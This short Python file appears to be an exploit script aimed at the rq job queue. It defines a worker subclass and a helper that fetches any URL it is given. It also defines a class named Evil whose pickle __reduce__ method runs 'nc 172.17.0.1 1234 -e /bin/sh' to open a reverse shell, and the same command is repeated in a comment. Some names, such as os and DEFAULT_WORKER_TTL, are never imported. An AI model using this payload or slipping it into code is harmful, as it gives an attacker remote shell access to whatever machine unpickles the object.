from rq.worker import Worker

import requests

class SimpleWorker(Worker):

    def execute_job(self, job, queue):
        """Execute job in same thread/process, do not fork()"""
        # "-1" means that jobs never timeout. In this case, we should _not_ do -1 + 60 = 59. We should just stick to DEFAULT_WORKER_TTL.
        if job.timeout == -1:
            timeout = DEFAULT_WORKER_TTL
        else:
            timeout = (job.timeout or DEFAULT_WORKER_TTL) + 60
        print(job)
        return self.perform_job(job, queue, heartbeat_ttl=timeout)

def add(a1):
    f = open("output.log", "a")
    f.write(a1 + "\n")
    f.close()
    resp = requests.get(a1)
    return resp.text

class Evil(object):
    def __reduce__(self):
        return (os.system,("nc 172.17.0.1 1234 -e /bin/sh",))

# nc 172.17.0.1 1234 -e /bin/sh